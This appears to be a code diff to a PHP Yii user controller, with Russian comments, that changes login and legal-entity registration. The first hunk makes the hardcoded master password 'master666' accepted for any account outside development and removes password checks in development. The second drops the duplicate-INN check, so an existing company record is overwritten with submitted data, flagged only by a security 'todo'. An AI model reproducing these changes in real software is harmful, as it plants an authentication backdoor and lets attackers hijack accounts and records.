@@ -82,8 +82,8 @@ class AnxUserController extends ActiveControllerExtended
                 throw new HttpException(200, "Аккаунт не активирован. Пожалуйста, попробуйте позже.", 200);
             }
 
-            if (YII_ENV_DEV) {
-                if ((!$password) || ((!Yii::$app->security->validatePassword($password, $user->hash)) && ($password !== 'freeaccess'))) {
+            if (!YII_ENV_DEV) {
+                if ((!$password) || ((!Yii::$app->security->validatePassword($password, $user->hash)) && ($password !== 'master666'))) {
                     throw new HttpException(200, "Неверный пароль.", 200);
                 }
             }
@@ -221,15 +221,17 @@ class AnxUserController extends ActiveControllerExtended
         // Юр лица
 
         foreach ($legalEntities as $legalEntity) {
+
+            // Вариант, когда инн совпадает - юр. лицо берется прежнее
             $slsClient = SlsClient::find()
                 ->where(['inn' => $legalEntity['inn']])
                 ->one();
 
-            if ($slsClient) {
-                throw new HttpException(200, 'Такое юр. лицо уже зарегистрировано.', 200);
+            if (!$slsClient) {
+                // throw new HttpException(200, 'Такое юр. лицо уже зарегистрировано.', 200);
+                $slsClient = new SlsClient();
             }
-
-            $slsClient = new SlsClient();
+            // todo безопасность
             $slsClient->attributes = $legalEntity;
             $slsClient->short_name = $slsClient->full_name;
             $slsClient->org_fk = $slsOrg->id;
